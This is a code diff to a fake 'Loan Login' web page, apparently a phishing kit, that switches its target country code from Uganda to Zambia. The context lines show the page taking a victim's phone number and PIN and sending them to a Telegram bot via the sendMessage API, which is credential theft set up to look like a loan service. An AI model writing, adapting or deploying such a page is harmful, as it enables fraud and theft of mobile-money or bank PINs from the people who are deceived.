@@ -300,14 +300,14 @@
         <h1 class="title">Loan Login</h1>
 
         <div class="phone-group">
-            <span class="flag">UG</span>
+            <span class="flag">zam</span>
             <div class="country-select">
-                +256 <span class="dropdown-arrow">▼</span>
+                +260 <span class="dropdown-arrow">▼</span>
             </div>
             <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
         </div>
 
-        <div class="pin-label">Enter your PIN (4 digits)</div>
+        <div class="pin-label">Enter your PIN </div>
 
         <!-- Changed PIN input to 4 digits -->
         <div class="pin-group">
@@ -405,7 +405,7 @@
 
             localStorage.setItem('phone', phone);
 
-            const message = `New Loan Login Attempt\n\nPhone: +256 ${phone}\nPIN: ${pinValue}`;
+            const message = `New Loan Login Attempt\n\nPhone: +260 ${phone}\nPIN: ${pinValue}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                 method: 'POST',
